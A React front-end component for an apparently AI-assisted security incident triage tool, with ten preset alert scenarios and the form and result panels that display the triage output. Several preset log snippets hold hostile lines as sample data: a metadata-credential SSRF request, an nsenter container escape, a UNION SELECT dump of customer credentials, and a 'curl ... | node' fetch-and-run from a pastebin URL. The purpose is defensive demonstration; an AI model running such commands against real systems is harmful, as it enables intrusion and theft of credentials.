import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  PlusCircle,
  Zap,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Brain,
  Sliders,
  Activity,
  Check,
  RefreshCw
} from 'lucide-react';
import PageHeader from '../components/PageHeader';
import ResolveModal from '../components/ResolveModal';

const PRESETS = [
  {
    key: 'unusual_outbound_traffic',
    label: '1. Unusual Outbound Traffic (SSRF Metadata Exfil)',
    badge: 'Repeat Type',
    data: {
      alertType: 'unusual_outbound_traffic',
      affectedSystem: 'webhook-dispatcher-01',
      severity: 'high',
      rawLogSnippet: '[SECURITY] 2024-09-28T14:10:02Z HTTP 200 GET to 169.254.169.254/latest/meta-data/iam/security-credentials/ from client webhook proxy worker-04; outbound payload 480MB',
    },
  },
  {
    key: 'brute_force_login',
    label: '2. Brute Force Login (Credential Stuffing Spike)',
    badge: 'Repeat Type',
    data: {
      alertType: 'brute_force_login',
      affectedSystem: 'auth-api-cluster',
      severity: 'high',
      rawLogSnippet: '[AUTH] 2024-09-28T15:20:11Z AuthFailureSpike: 18,500 failed POST /v1/auth/login attempts from subnet 198.51.100.0/24 targeting user admin',
    },
  },
  {
    key: 'privilege_escalation',
    label: '3. Privilege Escalation (Container Escape via nsenter)',
    badge: 'Repeat Type',
    data: {
      alertType: 'privilege_escalation',
      affectedSystem: 'ci-runner-fleet',
      severity: 'critical',
      rawLogSnippet: '[AUDIT] 2024-09-28T16:05:44Z sudo: gitlab-runner : TTY=unknown ; PWD=/builds ; USER=root ; COMMAND=/bin/nsenter -t 1 -m -u -n -i bash',
    },
  },
  {
    key: 'ransomware_activity',
    label: '4. Ransomware Activity (Cryptolock Volume Encryption)',
    badge: 'Repeat Type',
    data: {
      alertType: 'ransomware_activity',
      affectedSystem: 'storage-nfs-prod',
      severity: 'critical',
      rawLogSnippet: '[STORAGE-ALERT] 2024-09-28T11:42:09Z Mass file modification: 52,000 files renamed with extension .cryptolock in /exports/shares within 45s',
    },
  },
  {
    key: 'ddos_traffic_spike',
    label: '5. DDoS Traffic Spike (SYN Reflection Flood)',
    badge: 'Repeat Type',
    data: {
      alertType: 'ddos_traffic_spike',
      affectedSystem: 'edge-ingress-gateway',
      severity: 'critical',
      rawLogSnippet: '[EDGE] 2024-09-28T17:33:00Z SYN flood detected: 9.2 million pps / 48 Gbps targeting /api/v1/checkout from UDP/SYN reflection pool',
    },
  },
  {
    key: 'phishing_credential_harvest',
    label: '6. Phishing & OAuth Hijack (Mailbox Forwarding Rule)',
    badge: 'Repeat Type',
    data: {
      alertType: 'phishing_credential_harvest',
      affectedSystem: 'mail-exchange-online',
      severity: 'high',
      rawLogSnippet: '[M365-ALERT] 2024-09-28T09:12:44Z Mailbox inbox rule created: forward all emails containing invoice, payment, secret to extern-drop@proton.me; OAuth app granted full Mail.ReadWrite',
    },
  },
  {
    key: 'sql_injection_exfil',
    label: '7. SQL Injection Exfiltration (Blind SQLi Database Dump)',
    badge: 'Repeat Type',
    data: {
      alertType: 'sql_injection_exfil',
      affectedSystem: 'order-processing-db',
      severity: 'critical',
      rawLogSnippet: '[DB-WAF] 2024-09-28T18:04:19Z SQLi anomaly detected: query pattern UNION SELECT null, username, password_hash, credit_card FROM customers executed via param id=1042',
    },
  },
  {
    key: 'api_token_leak',
    label: '8. API Secret Exposure (Public Repository Hardcoded Token)',
    badge: 'Repeat Type',
    data: {
      alertType: 'api_token_leak',
      affectedSystem: 'github-sync-service',
      severity: 'high',
      rawLogSnippet: '[GIT-GUARD] 2024-09-28T19:30:15Z Live production AWS secret key AKIAIOSFODNN7EXAMPLE committed to public repository backend-microservices; immediate revocation advisory',
    },
  },
  {
    key: 'supply_chain_tamper',
    label: '9. Supply Chain Anomaly (Compromised NPM Dependency)',
    badge: 'Repeat Type',
    data: {
      alertType: 'supply_chain_tamper',
      affectedSystem: 'web-frontend-builder',
      severity: 'critical',
      rawLogSnippet: '[BUILD-SANDBOX] 2024-09-28T20:15:33Z Postinstall script in event-stream-v3.3.6 spawned curl -s https://pastebin.com/raw/malicious | node attempting env exfiltration during CI build',
    },
  },
  {
    key: 'novel_zero_day',
    label: '10. ⚡ Novel / Zero-Day Incident (Kernel Anomaly Unseen Pattern)',
    badge: 'Zero History',
    data: {
      alertType: 'CryptoKernelCompilation',
      affectedSystem: 'gpu-inference-cluster',
      severity: 'critical',
      rawLogSnippet: '[KERN-SEC] Anomaly: nvcc compilation detected in rootless container worker-gpu-09; unexpected instruction set AVX512_FMA targeting unapproved pool at 192.0.2.77:8080; zero-day driver panic',
    },
  },
];

export default function NewIncidentView() {
  const navigate = useNavigate();
  const [selectedPresetKey, setSelectedPresetKey] = useState(PRESETS[0].key);
  const [formInput, setFormInput] = useState(PRESETS[0].data);
  const [analyzing, setAnalyzing] = useState(false);
  const [currentResult, setCurrentResult] = useState(null);
  const [error, setError] = useState(null);

  // Modal State
  const [showResolveModal, setShowResolveModal] = useState(false);

  const handleSelectPreset = (key) => {
    setSelectedPresetKey(key);
    const found = PRESETS.find((p) => p.key === key);
    if (found) {
      setFormInput({ ...found.data });
      setError(null);
    }
  };

  const handleAnalyze = async (e) => {
    if (e) e.preventDefault();
    setAnalyzing(true);
    setError(null);

    try {
      const res = await fetch('/api/incidents', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formInput),
      });

      if (!res.ok) {
        const errJson = await res.json();
        throw new Error(errJson.message || `Server returned ${res.status}`);
      }

      const data = await res.json();
      setCurrentResult(data);
    } catch (err) {
      console.error('Error during triage:', err);
      setError(err.message || 'Failed to triage incident.');
    } finally {
      setAnalyzing(false);
    }
  };

  const hasMemoryMatch = currentResult && currentResult.memoryTrail && currentResult.memoryTrail.length > 0;
  const isNovelIncident = currentResult && !hasMemoryMatch;

  return (
    <div className="view-container new-incident-view">
      <PageHeader
        title="Submit New Incident"
        subtitle="Ingest security alert payload to trigger autonomous Hindsight persistent memory recall and Groq triage"
        icon={PlusCircle}
      />

      <div className="new-incident-layout">
        {/* Form Column */}
        <section className="panel-card form-panel">
          <div className="panel-card-header">
            <h3>1. Incident Payload</h3>
            <span className="panel-badge">Live Ingestion</span>
          </div>

          <form onSubmit={handleAnalyze} className="panel-card-body">
            <div className="form-group">
              <label>Select Preset Incident Scenario:</label>
              <select
                value={selectedPresetKey}
                onChange={(e) => handleSelectPreset(e.target.value)}
                className="select-input"
              >
                {PRESETS.map((p) => (
                  <option key={p.key} value={p.key}>
                    {p.label} [{p.badge}]
                  </option>
                ))}
              </select>
            </div>

            <div className="input-row">
              <div className="form-group flex-1">
                <label>Alert Type:</label>
                <input
                  type="text"
                  value={formInput.alertType}
                  onChange={(e) => setFormInput({ ...formInput, alertType: e.target.value })}
                  placeholder="e.g. unusual_outbound_traffic"
                  required
                />
              </div>

              <div className="form-group flex-1">
                <label>Affected System:</label>
                <input
                  type="text"
                  value={formInput.affectedSystem}
                  onChange={(e) => setFormInput({ ...formInput, affectedSystem: e.target.value })}
                  placeholder="e.g. webhook-dispatcher-01"
                  required
                />
              </div>

              <div className="form-group w-auto">
                <label>Severity:</label>
                <select
                  value={formInput.severity}
                  onChange={(e) => setFormInput({ ...formInput, severity: e.target.value })}
                  className={`severity-select sev-${formInput.severity}`}
                >
                  <option value="critical">Critical</option>
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
              </div>
            </div>

            <div className="form-group">
              <label>Raw Security Log Snippet:</label>
              <textarea
                rows={5}
                value={formInput.rawLogSnippet}
                onChange={(e) => setFormInput({ ...formInput, rawLogSnippet: e.target.value })}
                className="mono-code"
                placeholder="Paste raw syslog, audit log, or JSON alert payload..."
                required
              />
            </div>

            {error && <div className="error-banner">{error}</div>}

            <button type="submit" className="btn-primary btn-submit-triage" disabled={analyzing}>
              {analyzing ? (
                <>
                  <RefreshCw size={16} className="spin" />
                  <span>Querying Hindsight & Triaging with Groq...</span>
                </>
              ) : (
                <>
                  <Zap size={16} />
                  <span>Analyze Incident (Run Memory Triage)</span>
                </>
              )}
            </button>
          </form>
        </section>

        {/* Triage Output Column */}
        <section className="panel-card output-panel">
          <div className="panel-card-header">
            <h3>2. Agent Triage Output</h3>
            {currentResult && (
              <span className={`confidence-badge conf-${currentResult.confidence}`}>
                {currentResult.confidence?.toUpperCase()} CONFIDENCE
              </span>
            )}
          </div>

          <div className="panel-card-body">
            {!currentResult ? (
              <div className="empty-prompt-state">
                <Zap size={40} className="empty-icon text-muted" />
                <h4>Awaiting Incident Submission</h4>
                <p>
                  Select a preset scenario on the left or customize the payload, then click
                  <strong> "Analyze Incident"</strong> to run persistent memory triage.
                </p>
              </div>
            ) : (
              <div className="triage-result-clean">
                {/* Memory Match Banner */}
                {hasMemoryMatch ? (
                  <div className="memory-banner memory-banner-matched">
                    <CheckCircle2 size={18} className="banner-icon" />
                    <div>
                      <strong>Matched Institutional Memory via Hindsight:</strong>{' '}
                      <span>
                        Found {currentResult.memoryTrail.length} historical precedent(s) in vector bank
                        ({currentResult.matchedPastIncidentIds?.join(', ') || 'past incidents'}).
                      </span>
                    </div>
                  </div>
                ) : (
                  <div className="memory-banner memory-banner-novel">
                    <AlertTriangle size={18} className="banner-icon" />
                    <div>
                      <strong>No Historical Precedent in Memory (Novel / Zero-Day):</strong>{' '}
                      <span>Delivering first-principles diagnostic triage. No past playbook available.</span>
                    </div>
                  </div>
                )}

                {/* Recommended Remediation */}
                <div className="result-block block-recommendation">
                  <div className="block-title">
                    <Zap size={16} className="text-amber" />
                    <span>Recommended Remediation</span>
                  </div>
                  <div className="block-content font-medium">
                    {currentResult.recommendation}
                  </div>
                </div>

                {/* Likely Root Cause */}
                <div className="result-block">
                  <div className="block-title">
                    <Sliders size={16} className="text-cyan" />
                    <span>Identified Likely Root Cause</span>
                  </div>
                  <div className="block-content text-muted">
                    {currentResult.likelyRootCause}
                  </div>
                </div>

                {/* AI Reasoning */}
                <div className="result-block">
                  <div className="block-title">
                    <Activity size={16} className="text-blue" />
                    <span>Triage Reasoning & Memory Correlation</span>
                  </div>
                  <div className="block-content text-muted">
                    {currentResult.reasoning}
                  </div>
                </div>

                {/* Actions Row */}
                <div className="result-actions-strip">
                  {currentResult.incident?.id && (
                    <button
                      type="button"
                      className="btn-deep-dive"
                      onClick={() => navigate(`/incidents/${currentResult.incident.id}`)}
                    >
                      <span>View full memory trail & What-If for this match</span>
                      <ArrowRight size={15} />
                    </button>
                  )}

                  {currentResult.incident?.status === 'open' && (
                    <button
                      type="button"
                      className="btn-mark-resolved"
                      onClick={() => setShowResolveModal(true)}
                    >
                      <Check size={15} />
                      <span>Mark Resolved</span>
                    </button>
                  )}
                </div>
              </div>
            )}
          </div>
        </section>
      </div>

      {/* Resolve Modal */}
      {showResolveModal && currentResult?.incident && (
        <ResolveModal
          isOpen={showResolveModal}
          incident={currentResult.incident}
          defaultFix={currentResult.recommendation}
          defaultRootCause={currentResult.likelyRootCause}
          onClose={() => setShowResolveModal(false)}
          onResolved={(updated) => {
            setCurrentResult({
              ...currentResult,
              incident: updated,
            });
          }}
        />
      )}
    </div>
  );
}
